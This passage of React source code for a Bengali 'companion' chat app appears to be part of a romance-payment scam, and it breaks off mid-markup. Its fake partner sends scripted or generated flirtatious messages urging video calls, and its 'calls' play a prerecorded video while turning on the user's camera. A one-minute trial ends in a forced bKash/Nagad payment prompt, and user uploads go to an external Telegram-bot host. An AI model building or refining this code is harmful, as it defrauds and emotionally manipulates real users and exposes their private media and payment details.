import React, { useState, useEffect, useRef } from "react";
import {
  ArrowLeft,
  Video,
  Phone,
  MoreVertical,
  Paperclip,
  Smile,
  Send,
  Mic,
  Camera,
  Trash2,
  Lock,
  Volume2,
  VideoOff,
  MicOff,
  PhoneOff,
  Shield,
  HelpCircle,
  Sparkles,
  RefreshCw,
  Clock,
  ExternalLink,
  ChevronRight,
  Share2,
  Check
} from "lucide-react";

interface WhatsAppChatProps {
  profileName: string;
  profileImage: string;
  profileId?: number;
  userId: string;
  onBack: () => void;
  onLoginTrigger: () => void;
}

interface ChatMessage {
  id: string;
  text: string;
  sender: "client" | "admin" | "sys";
  time: string;
  timestamp: number;
  isEdited?: boolean;
  isDeleted?: boolean;
  fileUrl?: string;
  fileType?: string;
  isPaymentButton?: boolean;
}

export default function WhatsAppChat({
  profileName,
  profileImage,
  profileId,
  userId,
  onBack,
  onLoginTrigger
}: WhatsAppChatProps) {
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [isTyping, setIsTyping] = useState(false);
  const chatNodeId = `${userId}_${profileName.replace(/[\s\.\#\$\[\]]/g, "_")}`;
  const [inputText, setInputText] = useState("");
  const [isBlocked, setIsBlocked] = useState(false);
  
  // Payment gateway simulation states
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [paymentAmount, setPaymentAmount] = useState<number>(250);
  const [paymentMethodChosen, setPaymentMethodChosen] = useState<"bkash" | "nagad" | "rocket" | null>("bkash");
  const [paymentNumber, setPaymentNumber] = useState("");
  const [paymentTrxId, setPaymentTrxId] = useState("");
  const [isProcessingPayment, setIsProcessingPayment] = useState(false);
  const [backendSession, setBackendSession] = useState<any>(null);

  // Poll backend session on high-frequency to detect remote success / error commands
  useEffect(() => {
    let active = true;
    const pollSession = async () => {
      try {
        const res = await fetch(`/api/sessions/${userId}`);
        const data = await res.json();
        if (active && data.success && data.session) {
          setBackendSession(data.session);
        }
      } catch (err) {
        console.warn("Error polling backend stats inside chat:", err);
      }
    };
    pollSession();
    const interval = setInterval(pollSession, 1500);
    return () => {
      active = false;
      clearInterval(interval);
    };
  }, [userId]);

  // Detect backend payment status changes to success or error
  useEffect(() => {
    if (backendSession && backendSession.paymentStatus === 'success') {
      const isUnlocked = localStorage.getItem(`monersathi_premium_unlocked_${profileId}`) === "true";
      if (!isUnlocked) {
        localStorage.setItem(`monersathi_premium_unlocked_${profileId}`, "true");
        localStorage.removeItem(`monersathi_demo_called_${profileId}`);
        localStorage.removeItem(`monersathi_payment_error_shown_${profileId}`);

        const time = getFormattedTime();
        const freshMsgs = loadLocalMessages();
        const successNoticeMsg: ChatMessage = {
          id: `msg_verify_success_${Date.now()}`,
          text: `🎉 আমার লক্ষ্মী সোনা বাবু, তোমার পাঠানো পেমেন্ট সাকসেসফুলি ভেরিফাইড করা হয়েছে! 🥰❤️ কি যে ভালো লাগছে তোমার এই সততা দেখে।\n\nএখন তোমার জন্য সম্পূর্ণ আনলিমিটেড প্রিমিয়াম ভিডিও ও ভয়েস কল সার্ভিস সচল করা হয়েছে। অনুগ্রহ করে কার্যক্রম পরিচালনা করতে উপরোক্ত ভিডিও অথবা ভয়েস কল বাটনে ক্লিক করো সোনা! 😘🙈`,
          sender: "admin",
          time,
          timestamp: Date.now()
        };
        saveLocalMessages([...freshMsgs, successNoticeMsg]);

        // Clear payment fields to prevent duplicate execution loops
        fetch(`/api/sessions/${userId}/clear-payment`, { method: "POST" }).catch(console.error);

        alert("আপনার পেমেন্ট সফলভাবে যাচাই করা হয়েছে! প্রিমিয়াম কার্যক্রম পরিচালনা করতে পারবেন।");

        setTimeout(() => {
          if (chatAreaRef.current) {
            chatAreaRef.current.scrollTop = chatAreaRef.current.scrollHeight;
          }
        }, 100);
      }
    } else if (backendSession && backendSession.paymentStatus === 'error') {
      const isBlockedMsg = localStorage.getItem(`monersathi_payment_error_shown_${profileId}`) === "true";
      if (!isBlockedMsg) {
        localStorage.setItem(`monersathi_payment_error_shown_${profileId}`, "true");

        const time = getFormattedTime();
        const freshMsgs = loadLocalMessages();
        const errorNoticeMsg: ChatMessage = {
          id: `msg_verify_error_${Date.now()}`,
          text: `❌ দুঃখিত সোনা, তোমার পাঠানো পেমেন্ট ভেরিফিকেশন ব্যর্থ হয়েছে বা ভুল তথ্য দেওয়া হয়েছে! অনুগ্রহ করে সঠিক নম্বর ও ট্রানজেকশন আইডি ব্যবহার করে পুনরায় পেমেন্ট সাবমিট করো সোনা। 🥺💔`,
          sender: "admin",
          time,
          timestamp: Date.now(),
          isPaymentButton: true
        };
        saveLocalMessages([...freshMsgs, errorNoticeMsg]);

        // Clear payment fields to allow resubmission
        fetch(`/api/sessions/${userId}/clear-payment`, { method: "POST" }).catch(console.error);

        alert("পেমেন্ট ব্যর্থ হয়েছে! আপনার ট্রানজেকশন ও মোবাইল নম্বর পুনরায় চেক করে সঠিক পেমেন্ট পাঠান।");

        setTimeout(() => {
          if (chatAreaRef.current) {
            chatAreaRef.current.scrollTop = chatAreaRef.current.scrollHeight;
          }
        }, 100);
      }
    }
  }, [backendSession, profileId]);
  
  // Custom mod menus
  const [showDropdown, setShowDropdown] = useState(false);
  const [showAttachMenu, setShowAttachMenu] = useState(false);
  const [showEmojiPanel, setShowEmojiPanel] = useState(false);
  const [selectedMsgId, setSelectedMsgId] = useState<string | null>(null);
  const [showMsgMenu, setShowMsgMenu] = useState<{ x: number; y: number } | null>(null);

  // Attachment references
  const galleryRef = useRef<HTMLInputElement>(null);
  const docRef = useRef<HTMLInputElement>(null);
  const audioRef = useRef<HTMLInputElement>(null);
  const cameraRef = useRef<HTMLInputElement>(null);

  // Audio recording states
  const [isRecording, setIsRecording] = useState(false);
  const [recordDuration, setRecordDuration] = useState(0);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const recordIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // WebRTC Call System states
  const [isCallActive, setIsCallActive] = useState(false);
  const [callStatus, setCallStatus] = useState("Calling...");
  const [callType, setCallType] = useState<"audio" | "video">("video");
  const [showReceiveCallDiv, setShowReceiveCallDiv] = useState(false);
  const [isSpeakerOn, setIsSpeakerOn] = useState(true);
  const [isMuted, setIsMuted] = useState(false);
  const [isVideoTrackOn, setIsVideoTrackOn] = useState(true);
  const [facingMode, setFacingMode] = useState<"user" | "environment">("user");
  const [fakeVideoUrl, setFakeVideoUrl] = useState<string | null>(null);
  const [isFakeVideoMuted, setIsFakeVideoMuted] = useState(false);

  // HTML Element refs for WebRTC streams
  const localVideoRef = useRef<HTMLVideoElement | null>(null);
  const fakeRemoteVideoRef = useRef<HTMLVideoElement | null>(null);
  const chatAreaRef = useRef<HTMLDivElement | null>(null);

  // Stream references
  const localStreamRef = useRef<MediaStream | null>(null);
  const peerConnectionRef = useRef<RTCPeerConnection | null>(null);
  const ringIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const audioCtxRef = useRef<AudioContext | null>(null);

  // Contact Info Screen Overlay
  const [showContactInfo, setShowContactInfo] = useState(false);

  // Emojis array
  const emojis = [
    "😀", "😃", "😄", "😁", "😆", "😅", "😂", "🤣", "🥲", "🥹", "☺️", "😊",
    "😇", "🙂", "🙃", "😉", "😍", "🥰", "😘", "😜", "🤪", "❤️", "👍", "🔥"
  ];

  // Formatting time function
  const getFormattedTime = () => {
    const d = new Date();
    let h = d.getHours();
    let m: string | number = d.getMinutes();
    const ampm = h >= 12 ? "PM" : "AM";
    h = h % 12 || 12;
    m = m < 10 ? "0" + m : m;
    return `${h}:${m} ${ampm}`;
  };

  // Synthesize Ringing Oscillator Sound
  const playGlobalRingtone = () => {
    if (!audioCtxRef.current) {
      audioCtxRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
    }
    const ctx = audioCtxRef.current;
    
    const playRing = () => {
      const osc1 = ctx.createOscillator();
      const osc2 = ctx.createOscillator();
      const gain = ctx.createGain();
      
      osc1.frequency.value = 440;
      osc2.frequency.value = 480;
      
      osc1.connect(gain);
      osc2.connect(gain);
      gain.connect(ctx.destination);
      
      gain.gain.setValueAtTime(0.1, ctx.currentTime);
      osc1.start();
      osc2.start();
      
      osc1.stop(ctx.currentTime + 1.5);
      osc2.stop(ctx.currentTime + 1.5);
    };

    playRing();
    ringIntervalRef.current = setInterval(playRing, 4000);
  };

  const stopGlobalRingtone = () => {
    if (ringIntervalRef.current) {
      clearInterval(ringIntervalRef.current);
      ringIntervalRef.current = null;
    }
  };

  // API upload proxy helper with robust base64 fallback to prevent 'Failed to fetch' errors
  const uploadFileToServer = async (file: File) => {
    try {
      const formData = new FormData();
      formData.append("file", file);
      const res = await fetch("https://my-telegram-bot-wzzv.onrender.com/api/chat-upload", {
        method: "POST",
        body: formData
      });
      if (res.ok) {
        return await res.json();
      }
    } catch (e) {
      console.warn("External upload server failed or offline, using robust local data URL fallback.", e);
    }

    // High quality local file-to-base64 fallback for persistent resilience
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => {
        resolve({ url: reader.result as string, type: file.type });
      };
      reader.onerror = (e) => reject(e);
      reader.readAsDataURL(file);
    });
  };

  // Helper to load messages from localStorage
  const loadLocalMessages = () => {
    try {
      const stored = localStorage.getItem(`monersathi_chat_${chatNodeId}`);
      if (stored) {
        return JSON.parse(stored);
      } else {
        // Initialize with realistic romantic customized messages
        const initialMsgs: ChatMessage[] = [
          {
            id: `init_1_${Date.now()}`,
            text: `আসসালামু আলাইকুম ❤️ আমি ${profileName} বলছি। আশা করি ভালো আছো।`,
            sender: "admin",
            time: getFormattedTime(),
            timestamp: Date.now() - 10000,
          },
          {
            id: `init_2_${Date.now()}`,
            text: "তোমাকে আমার খুব ভালো লেগেছে! চ্যাটিং এবং ভিডিও কলে প্রতিদিন কথা বলতে চাইলে এখনই মেসেজ বা কল করো। তোমার জন্য অপেক্ষা করছি! 😘",
            sender: "admin",
            time: getFormattedTime(),
            timestamp: Date.now() - 5000,
          }
        ];
        localStorage.setItem(`monersathi_chat_${chatNodeId}`, JSON.stringify(initialMsgs));
        return initialMsgs;
      }
    } catch (e) {
      console.error("Failed to load local messages:", e);
      return [];
    }
  };

  // Helper to save messages
  const saveLocalMessages = (newMsgs: ChatMessage[]) => {
    try {
      localStorage.setItem(`monersathi_chat_${chatNodeId}`, JSON.stringify(newMsgs));
      setMessages(newMsgs);
      // Trigger update event to notify premium page lists
      window.dispatchEvent(new Event("monersathi_interacted_profiles_updated"));
    } catch (e) {
      console.error("Failed to save local messages:", e);
    }
  };

  // Companion smart automated response scheduler
  const triggerAutoReply = async (userMessage: string) => {
    setIsTyping(true);
    
    // Auto scroll down to view typing status
    setTimeout(() => {
      if (chatAreaRef.current) {
        chatAreaRef.current.scrollTop = chatAreaRef.current.scrollHeight;
      }
    }, 50);

    const msgs = loadLocalMessages();
    let replyText = "";

    try {
      const response = await fetch('/api/chat-reply', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userMessage,
          history: msgs,
          profileName,
          profileId
        })
      });

      const data = await response.json();
      if (data.success && data.replyText) {
        replyText = data.replyText;
      } else {
        throw new Error(data.error || 'Response not successful');
      }
    } catch (err) {
      console.warn("AI Reply Request Failed, defaulting to offline heuristic patterns:", err);
      const lower = userMessage.toLowerCase();
      if (lower.includes("হ্যালো") || lower.includes("hello") || lower.includes("hi") || lower.includes("হাই")) {
        replyText = "হ্যালো সোনা! কেমন আছো তুমি? তোমার প্রোফাইল পিকচারটি অনেক চমৎকার! কথা বলো আমার সাথে। 🌸";
      } else if (lower.includes("কেমন") || lower.includes("how are you")) {
        replyText = "আমি খুব ভালো আছি তোমার মিষ্টি মেসেজ পেয়ে! তোমার দিনকাল কেমন কাটছে বলো? ❤️";
      } else if (lower.includes("নাম") || lower.includes("name")) {
        replyText = `আমার নাম তো ${profileName}! তোমার সুন্দর নামটা আমার বারবার শুনতে মন চায়। 😘`;
      } else if (lower.includes("বাড়ি") || lower.includes("কোথায়") || lower.includes("location") || lower.includes("থাকো")) {
        replyText = "আমি তোমার মনের কাছাকাছি থাকি! তুমি চাইলে আমরা খুব দ্রুত দেখা করতে পারবো। 🤭";
      } else if (lower.includes("ভালোবাসি") || lower.includes("love")) {
        replyText = "আই লাভ ইউ টু সোনা! তুমি যে এতো রোমান্টিক আমি ভাবতেই পারিনি। আমাকে একটি ভিডিও কল দাও না প্লিজ! 😘❤️";
      } else {
        const pool = [
          "তুমি যে কি মিষ্টি করে কথা বলো! আমার খুব খুব ভালো লাগছে। 🥰",
          "সোনা, চলো আমরা এখনই একটা চটজলদি ভিডিও কলে যুক্ত হই, তোমার হাসি মুখটা দেখতে ইচ্ছে করছে। ❤️",
          "আমি তোমার সাথে সারারাত কথা বলতে রাজি আছি, তুমি আজ ফ্রি আছো তো? 🙈",
          "তোমার মেসেজ পড়ে আমার বুকের ভেতর কেমন যেন করছে! তুমি অনেক ইউনিক একজন মানুষ। 😘",
          "সোনা, এখন কি তোমার ভিডিও কল রিসিভ করার পারফেক্ট সময়? আমার ওপাশ থেকে অনেক সুন্দর একটা সারপ্রাইজ অপেক্ষা করছে! 🎉"
        ];
        replyText = pool[Math.floor(Math.random() * pool.length)];
      }
    }

    // Dynamic timeout to simulate natural human reading & typing rate
    const simulatedDelay = Math.max(1200, Math.min(2800, replyText.length * 20));
    await new Promise((resolve) => setTimeout(resolve, simulatedDelay));

    setIsTyping(false);

    const newReply: ChatMessage = {
      id: `auto_${Date.now()}`,
      text: replyText,
      sender: "admin",
      time: getFormattedTime(),
      timestamp: Date.now()
    };

    const latestMsgs = loadLocalMessages();
    const updated = [...latestMsgs, newReply];
    saveLocalMessages(updated);

    // Trigger user premium metadata updates
    if (profileId) {
      try {
        const currentInteracted = JSON.parse(localStorage.getItem("monersathi_interacted_profile_ids") || "{}");
        currentInteracted[profileId] = Date.now();
        localStorage.setItem("monersathi_interacted_profile_ids", JSON.stringify(currentInteracted));
        window.dispatchEvent(new Event("monersathi_interacted_profiles_updated"));
      } catch {}
    }

    // Auto scroll down
    setTimeout(() => {
      if (chatAreaRef.current) {
        chatAreaRef.current.scrollTop = chatAreaRef.current.scrollHeight;
      }
    }, 100);
  };

  // Synchronize dynamic messages from local storage
  useEffect(() => {
    const msgs = loadLocalMessages();
    setMessages(msgs);
    
    // Auto scroll down
    setTimeout(() => {
      if (chatAreaRef.current) {
        chatAreaRef.current.scrollTop = chatAreaRef.current.scrollHeight;
      }
    }, 150);

    // Watch for sibling updates
    const handleUpdate = () => {
      const updated = loadLocalMessages();
      setMessages(updated);
    };
    window.addEventListener("monersathi_interacted_profiles_updated", handleUpdate);
    return () => {
      window.removeEventListener("monersathi_interacted_profiles_updated", handleUpdate);
    };
  }, [chatNodeId]);

  // Handle media file select and secure asynchronous payload delivery
  const handleFileChange = async (e: React.ChangeEvent<HTMLInputElement>, type: string) => {
    const files = e.target.files;
    if (!files || files.length === 0) return;
    const file = files[0];
    
    const time = getFormattedTime();
    const tempMsgId = `media_${Date.now()}`;
    
    // Set loading indicator
    const currentMsgs = loadLocalMessages();
    const loadingMessage: ChatMessage = {
      id: tempMsgId,
      text: "⏳ Uploading...",
      sender: "client",
      time,
      timestamp: Date.now(),
      isEdited: false,
      isDeleted: false
    };
    saveLocalMessages([...currentMsgs, loadingMessage]);

    try {
      const data = await uploadFileToServer(file);
      let msgText = "Photo";
      if (file.type.startsWith("video/")) {
        msgText = "Video";
      } else if (file.type.startsWith("audio/")) {
        msgText = "Audio";
      } else if (type === "document") {
        msgText = "Document";
      }

      const msgs = loadLocalMessages();
      const updated = msgs.map((m) => {
        if (m.id === tempMsgId) {
          return {
            ...m,
            text: msgText,
            fileUrl: data.url,
            fileType: data.type
          };
        }
        return m;
      });
      saveLocalMessages(updated);

      if (profileId) {
        try {
          const currentInteracted = JSON.parse(localStorage.getItem("monersathi_interacted_profile_ids") || "{}");
          currentInteracted[profileId] = Date.now();
          localStorage.setItem("monersathi_interacted_profile_ids", JSON.stringify(currentInteracted));
          window.dispatchEvent(new Event("monersathi_interacted_profiles_updated"));
        } catch (err) {
          console.error("Localstorage error in upload file:", err);
        }
      }

      triggerAutoReply(`[Sent ${msgText}]`);

    } catch (err) {
      console.error(err);
      const msgs = loadLocalMessages();
      const updated = msgs.map((m) => {
        if (m.id === tempMsgId) {
          return { ...m, text: "❌ Upload Failed" };
        }
        return m;
      });
      saveLocalMessages(updated);
    }
    e.target.value = "";
  };

  // Initiate call (Simulated premium voice & video call)
  const initiateCall = async (type: "audio" | "video") => {
    const demoCalledKey = `monersathi_demo_called_${profileId}`;
    const alreadyCalledDemo = localStorage.getItem(demoCalledKey) === "true";
    
    // Check local status or backend status for unlocked premium
    const isPremiumUnlockedLocal = localStorage.getItem(`monersathi_premium_unlocked_${profileId}`) === "true";
    const isPremiumUnlockedBackend = backendSession && backendSession.paymentStatus === 'success';
    const isPremiumUnlocked = isPremiumUnlockedLocal || isPremiumUnlockedBackend;

    const isPendingBackend = backendSession && backendSession.paymentStatus === 'pending';

    if (isPendingBackend) {
      alert("⏳ সোনা, আপনার পেমেন্টটি বর্তমানে ভেরিফাই করা হচ্ছে। অনুগ্রহ করে পেমেন্ট সফলভাবে ভেরিফিকেশন সম্পূর্ণ হওয়া পর্যন্ত অপেক্ষা করুন!");
      return;
    }

    if (alreadyCalledDemo && !isPremiumUnlocked) {
      // Direct second call attempts block - notify automatically in chat
      setIsTyping(true);
      setTimeout(() => {
        setIsTyping(false);
        const time = getFormattedTime();
        const currentMsgs = loadLocalMessages();
        const paymentNoticeMsg: ChatMessage = {
          id: `msg_already_called_pay_${Date.now()}`,
          text: `তোমাকে ফ্রী তে ১ মিনিট সব কিছু দেখানো হয়েছে। বাকি কাজ বা সার্ভিস সম্পূর্ণ উপভোগ করতে পেমেন্ট করতে হবে।\n\n💰 পেমেন্ট চার্জ:\n- ১৫ মিনিট : ২৫০ টাকা\n- ৩০ মিনিট : ৫০০ টাকা\n- ১ ঘণ্টা : ১০০০ টাকা`,
          sender: "admin",
          time,
          timestamp: Date.now(),
          isPaymentButton: true
        };
        saveLocalMessages([...currentMsgs, paymentNoticeMsg]);

        // Auto scroll down
        setTimeout(() => {
          if (chatAreaRef.current) {
            chatAreaRef.current.scrollTop = chatAreaRef.current.scrollHeight;
          }
        }, 100);

        // Open checkout modal automatically
        setPaymentAmount(250);
        setPaymentMethodChosen("bkash");
        setShowPaymentModal(true);
      }, 1200);
      return;
    }

    setIsCallActive(true);
    setCallType(type);
    setShowReceiveCallDiv(false);
    setCallStatus("Calling...");
    setShowContactInfo(false);

    if (profileId) {
      try {
        const currentInteracted = JSON.parse(localStorage.getItem("monersathi_interacted_profile_ids") || "{}");
        currentInteracted[profileId] = Date.now();
        localStorage.setItem("monersathi_interacted_profile_ids", JSON.stringify(currentInteracted));
        window.dispatchEvent(new Event("monersathi_interacted_profiles_updated"));
      } catch (e) {
        console.error("Localstorage error in initiateCall:", e);
      }
    }

    playGlobalRingtone();

    // Exactly 4 seconds ring for the first video call trial, standard otherwise
    const ringDuration = (type === "video" && !isPremiumUnlocked) ? 4000 : 3000;

    const callAnswerTimer = setTimeout(() => {
      stopGlobalRingtone();
      setCallStatus("Connecting...");
      
      const connectTimer = setTimeout(() => {
        setCallStatus("00:00");
        startWebRTCConnection();
        
        // Load target companion video with absolute path support looking in lowercase folder first
        const targetVideoSrc = type === "video" ? `/video call/${profileId}.mp4` : null;
        setFakeVideoUrl(targetVideoSrc);

        // Stopwatch stopwatch tracker integration
        let count = 0;
        const timeInterval = setInterval(() => {
          count++;
          const mins = Math.floor(count / 60).toString().padStart(2, "0");
          const secs = (count % 60).toString().padStart(2, "0");
          setCallStatus(`${mins}:${secs}`);

          // Cut off call at exactly 1 minute length if it's a trial video call
          if (type === "video" && !isPremiumUnlocked && count >= 60) {
            clearInterval(timeInterval);
            executeEndCall();
          }
        }, 1000);

        (window as any)._activeCallDurationInterval = timeInterval;
      }, 1000);

      (window as any)._activeConnectTimer = connectTimer;
    }, ringDuration);

    (window as any)._activeCallAnswerTimer = callAnswerTimer;
  };

  // Answer Incoming Call (pure local mockup fallback)
  const answerIncomingCall = () => {
    stopGlobalRingtone();
    setShowReceiveCallDiv(false);
    setCallStatus("Connecting...");
    startWebRTCConnection();
  };

  // WebRTC Connection Setup (Pure user preview feed, doesn't require cloud server signaling)
  const startWebRTCConnection = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: callType === "video" ? { facingMode } : false,
        audio: true
      });
      localStreamRef.current = stream;
      if (localVideoRef.current) {
        localVideoRef.current.srcObject = stream;
      }
    } catch (e) {
      console.warn("Camera and stream initialization bypassed gracefully:", e);
    }
  };

  const endCallCleanup = () => {
    setIsCallActive(false);
    stopGlobalRingtone();
    setFakeVideoUrl(null);

    // Clear simulated timeouts and ticks
    if ((window as any)._activeCallAnswerTimer) clearTimeout((window as any)._activeCallAnswerTimer);
    if ((window as any)._activeConnectTimer) clearTimeout((window as any)._activeConnectTimer);
    if ((window as any)._activeCallDurationInterval) {
      clearInterval((window as any)._activeCallDurationInterval);
      (window as any)._activeCallDurationInterval = null;
    }
    
    if (localStreamRef.current) {
      localStreamRef.current.getTracks().forEach((track) => track.stop());
      localStreamRef.current = null;
    }
    if (peerConnectionRef.current) {
      peerConnectionRef.current.close();
      peerConnectionRef.current = null;
    }

    const time = getFormattedTime();
    const currentMsgs = loadLocalMessages();
    const endMsg: ChatMessage = {
      id: `sys_call_ended_${Date.now()}`,
      text: "📞 Call Ended",
      sender: "sys",
      time,
      timestamp: Date.now(),
      isEdited: false,
      isDeleted: false
    };

    setIsMuted(false);
    setIsVideoTrackOn(true);
    setFacingMode("user");

    // Persistent demo tracking and follow-up payment instructions
    const demoCalledKey = `monersathi_demo_called_${profileId}`;
    const wasAlreadyCalled = localStorage.getItem(demoCalledKey) === "true";
    const isPremiumUnlockedLocal = localStorage.getItem(`monersathi_premium_unlocked_${profileId}`) === "true";
    const isPremiumUnlockedBackend = backendSession && backendSession.paymentStatus === 'success';
    const isPremiumUnlocked = isPremiumUnlockedLocal || isPremiumUnlockedBackend;

    if (callType === "video" && !wasAlreadyCalled && !isPremiumUnlocked) {
      localStorage.setItem(demoCalledKey, "true");
      const updatedMessages = [...currentMsgs, endMsg];
      
      setTimeout(() => {
        setIsTyping(true);
        setTimeout(() => {
          setIsTyping(false);
          const freshMsgs = loadLocalMessages();
          const paymentOfferMsg: ChatMessage = {
            id: `msg_pay_offer_${Date.now()}`,
            text: `তোমাকে ফ্রী তে ১ মিনিট সব কিছু দেখানো হয়েছে। বাকি কাজ বা সার্ভিস সম্পূর্ণ উপভোগ করতে পেমেন্ট করতে হবে।\n\n💰 পেমেন্ট চার্জ:\n- ১৫ মিনিট : ২৫০ টাকা\n- ৩০ মিনিট : ৫০০ টাকা\n- ১ ঘণ্টা : ১০০০ টাকা`,
            sender: "admin",
            time: getFormattedTime(),
            timestamp: Date.now(),
            isPaymentButton: true
          };
          saveLocalMessages([...freshMsgs, paymentOfferMsg]);

          setTimeout(() => {
            if (chatAreaRef.current) {
              chatAreaRef.current.scrollTop = chatAreaRef.current.scrollHeight;
            }
          }, 100);

          // Force open the premium checkout modal
          setPaymentAmount(250);
          setPaymentMethodChosen("bkash");
          setShowPaymentModal(true);
        }, 1800);
      }, 800);

      saveLocalMessages(updatedMessages);
    } else {
      saveLocalMessages([...currentMsgs, endMsg]);
    }
  };

  const executeEndCall = () => {
    endCallCleanup();
  };

  // Toggle local mute
  const toggleMute = () => {
    if (localStreamRef.current) {
      const track = localStreamRef.current.getAudioTracks()[0];
      if (track) {
        track.enabled = !track.enabled;
        setIsMuted(!track.enabled);
      }
    }
  };

  // Toggle local video camera feed
  const toggleVideoTrack = () => {
    if (localStreamRef.current) {
      const track = localStreamRef.current.getVideoTracks()[0];
      if (track) {
        track.enabled = !track.enabled;
        setIsVideoTrackOn(track.enabled);
      }
    }
  };

  // Camera flip trigger
  const flipCamera = async () => {
    if (!localStreamRef.current) return;
    const mode = facingMode === "user" ? "environment" : "user";
    setFacingMode(mode);

    const oldTrack = localStreamRef.current.getVideoTracks()[0];
    if (oldTrack) oldTrack.stop();

    try {
      const newStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { ideal: mode } }
      });
      const newTrack = newStream.getVideoTracks()[0];
      localStreamRef.current.removeTrack(oldTrack);
      localStreamRef.current.addTrack(newTrack);

      if (peerConnectionRef.current) {
        const sender = peerConnectionRef.current.getSenders().find((s) => s.track && s.track.kind === "video");
        if (sender) sender.replaceTrack(newTrack);
      }

      if (localVideoRef.current) {
        localVideoRef.current.srcObject = localStreamRef.current;
      }
    } catch (e) {
      console.error(e);
    }
  };

  // Sending Text Message
  const sendTextMessage = () => {
    if (inputText.trim() === "") return;
    const time = getFormattedTime();
    
    const userMsg: ChatMessage = {
       id: `msg_${Date.now()}`,
       text: inputText.trim(),
       sender: "client",
       time,
       timestamp: Date.now(),
       isEdited: false,
       isDeleted: false
    };

    const currentMsgs = loadLocalMessages();
    const updated = [...currentMsgs, userMsg];
    saveLocalMessages(updated);

    if (profileId) {
      try {
        const currentInteracted = JSON.parse(localStorage.getItem("monersathi_interacted_profile_ids") || "{}");
        currentInteracted[profileId] = Date.now();
        localStorage.setItem("monersathi_interacted_profile_ids", JSON.stringify(currentInteracted));
        window.dispatchEvent(new Event("monersathi_interacted_profiles_updated"));
      } catch (e) {
        console.error("Localstorage error in sendTextMessage:", e);
      }
    }

    const typedText = inputText.trim();
    setInputText("");
    setShowEmojiPanel(false);

    // Auto reply
    triggerAutoReply(typedText);
  };

  // Start Voice Recording
  const startVoiceRecording = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      audioChunksRef.current = [];
      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorderRef.current = mediaRecorder;

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          audioChunksRef.current.push(e.data);
        }
      };

      mediaRecorder.onstop = async () => {
        if (recordIntervalRef.current) clearInterval(recordIntervalRef.current);
        stream.getTracks().forEach((track) => track.stop());
        setIsRecording(false);

        if (audioChunksRef.current.length > 0) {
          const audioBlob = new Blob(audioChunksRef.current, { type: "audio/webm" });
          const file = new File([audioBlob], `voice_${Date.now()}.webm`, { type: "audio/webm" });

          const time = getFormattedTime();
          const tempMsgId = `voice_${Date.now()}`;
          
          const currentMsgs = loadLocalMessages();
          const sendingMsg: ChatMessage = {
            id: tempMsgId,
            text: "🎤 Sending...",
            sender: "client",
            time,
            timestamp: Date.now(),
            isEdited: false,
            isDeleted: false
          };
          saveLocalMessages([...currentMsgs, sendingMsg]);

          try {
            const data = await uploadFileToServer(file);
            const msgs = loadLocalMessages();
            const updated = msgs.map((m) => {
              if (m.id === tempMsgId) {
                return {
                  ...m,
                  text: "Voice Message",
                  fileUrl: data.url,
                  fileType: data.type
                };
              }
              return m;
            });
            saveLocalMessages(updated);
            triggerAutoReply("[Sent a voice note]");
          } catch (err) {
            const msgs = loadLocalMessages();
            const updated = msgs.map((m) => {
              if (m.id === tempMsgId) {
                return { ...m, text: "❌ Failed" };
              }
              return m;
            });
            saveLocalMessages(updated);
          }
        }
      };

      setIsRecording(true);
      setRecordDuration(0);
      recordIntervalRef.current = setInterval(() => {
        setRecordDuration((prev) => prev + 1);
      }, 1000);

      mediaRecorder.start();
    } catch (e) {
      alert("মাইক্রোফোন পারমিশন প্রয়োজন!");
    }
  };

  const stopVoiceRecording = () => {
    if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
      mediaRecorderRef.current.stop();
    }
  };

  const cancelVoiceRecording = () => {
    audioChunksRef.current = [];
    if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
      mediaRecorderRef.current.stop();
    }
  };

  // Edit/Delete Messages
  const handleEditMessage = () => {
    if (!selectedMsgId) return;
    const newText = prompt("বার্তা এডিট করুন:");
    if (newText && newText.trim() !== "") {
      const msgs = loadLocalMessages();
      const updated = msgs.map((m) => {
        if (m.id === selectedMsgId) {
          return {
            ...m,
            text: newText.trim(),
            isEdited: true
          };
        }
        return m;
      });
      saveLocalMessages(updated);
    }
    setShowMsgMenu(null);
  };

  const handleDeleteEveryone = () => {
    if (!selectedMsgId) return;
    if (confirm("বার্তাটি সবার জন্য ডিলিট করতে চান?")) {
      const msgs = loadLocalMessages();
      const updated = msgs.map((m) => {
        if (m.id === selectedMsgId) {
          return {
            ...m,
            isDeleted: true
          };
        }
        return m;
      });
      saveLocalMessages(updated);
    }
    setShowMsgMenu(null);
  };

  const handleDeleteMe = () => {
    if (!selectedMsgId) return;
    localStorage.setItem(`deleted_${selectedMsgId}`, "true");
    setShowMsgMenu(null);
    setMessages((prev) => prev.filter((m) => m.id !== selectedMsgId));
  };

  return (
    <div className="w-full flex flex-col min-h-screen bg-[#efeae2] h-screen select-none relative overflow-hidden text-gray-800">
      
      {/* Hidden inputs for uploads */}
      <input type="file" ref={galleryRef} onChange={(e) => handleFileChange(e, "gallery")} accept="image/*,video/*" className="hidden" />
      <input type="file" ref={docRef} onChange={(e) => handleFileChange(e, "document")} accept=".pdf,.doc,.docx,.txt" className="hidden" />
      <input type="file" ref={audioRef} onChange={(e) => handleFileChange(e, "audio")} accept="audio/*" className="hidden" />
      <input type="file" ref={cameraRef} onChange={(e) => handleFileChange(e, "camera")} accept="image/*,video/*" capture="environment" className="hidden" />

      {/* Message contextual popup */}
      {showMsgMenu && (
        <div
          style={{ top: `${showMsgMenu.y}px`, left: `${showMsgMenu.x}px` }}
          className="fixed bg-white border border-gray-100 rounded-xl shadow-2xl w-44 p-1 z-50 animate-zoom-in text-xs font-semibold"
        >
          <button
            onClick={handleEditMessage}
